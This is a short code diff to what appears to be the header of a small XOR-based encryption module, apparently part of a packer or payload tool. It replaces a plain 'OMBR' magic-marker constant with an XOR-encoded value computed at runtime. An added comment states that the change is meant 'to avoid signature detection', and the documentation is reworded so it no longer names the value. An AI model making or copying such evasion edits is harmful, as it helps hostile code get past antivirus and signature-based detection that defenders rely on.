@@ -24,7 +24,11 @@
 //=============================================================================
 
 #define CRYPTO_DEFAULT_KEY      0xDEADBEEF
-#define CRYPTO_MARKER_MAGIC     0x4F4D4252  // "OMBR"
+// Magic marker - obfuscated to avoid signature detection
+// Runtime value: 0x4F4D4252 (computed via XOR)
+#define CRYPTO_MARKER_MAGIC_ENC 0x91E0FCBD
+#define CRYPTO_MARKER_MAGIC_KEY 0xDEADBEEF
+#define CRYPTO_MARKER_MAGIC     (CRYPTO_MARKER_MAGIC_ENC ^ CRYPTO_MARKER_MAGIC_KEY)
 #define CRYPTO_KEY_XOR_MASK     0xBABAB00E
 #define CRYPTO_HEADER_SIZE      8
 
@@ -84,7 +88,7 @@ bool Crypto_Decrypt(const UINT8* pEncrypted, size_t cbData, UINT32 dwKey,
  * Encrypt with header (includes magic and XOR'd key)
  *
  * Header format:
- * [0-3]  MARKER_MAGIC (0x4F4D4252 = "OMBR")
+ * [0-3]  MARKER_MAGIC (computed at runtime)
  * [4-7]  XOR'd key (key ^ KEY_XOR_MASK)
  * [8...]  Encrypted data
  *
